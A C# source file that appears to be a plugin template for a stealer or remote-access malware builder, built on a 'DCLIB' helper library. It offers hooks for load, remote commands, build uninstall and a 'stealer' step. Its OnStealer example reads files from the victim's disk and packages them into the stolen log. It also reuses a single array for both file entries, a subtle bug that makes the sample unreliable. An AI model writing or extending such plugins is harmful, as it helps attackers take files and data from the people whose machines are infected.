using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.CompilerServices;

[CompilerGenerated]
public class Plugin
{
    public void OnLoad(string HOST, string TOKEN, string PATH, string U_TAG)
    {
        string PluginConfig = DCLIB.GetConfigFile("MyConfigFile.cfg");

        string BaseDecodedPluginConfig = DCLIB.Base64Decode(DCLIB.GetConfigFile("MyConfigFile.cfg"));

        //YOUR CODE
    }
    
    
    public static string CommandName = "MyTestCommand";
    
    //Delete this method, if you don't use commands.
    public void OnCommand(string CommandParameter, string HOST, string TOKEN, string PATH)
    {
        //YOUR CODE ON COMMAND EXECUTE
    }
    
    //Delete this method, if you don't provide actions after deleting build.
    public void OnUninstall(string HOST, string TOKEN, string PATH)
    {
        //YOUR CODE ON BUILD UNINSTALL
    }
    
    //Delete this method, if you don't provide actions after execute stealer.
    public List<object[]> OnStealer(string HOST, string TOKEN, string PATH)
    {
        List<object[]> Content = new List<object[]>();
        
        object[] fileData = new object[2];
        
        //---------------------------------
        fileData[0] = "SomeLogs.txt"; //(String)File name in the log, or path with folder: "Other/SomeLogs.txt"
        fileData[1] = File.ReadAllBytes(@"C:\SomeImportantFile.txt"); //(Byte Array) Byte array of file.
        
        Content.Add(fileData);
        //---------------------------------
        fileData[0] = "SomeOtherLogs.txt";
        fileData[1] = File.ReadAllBytes(@"C:\SomeOtherFile.exe");
        
        Content.Add(fileData);
        //---------------------------------
        
        return Content;
    }
}

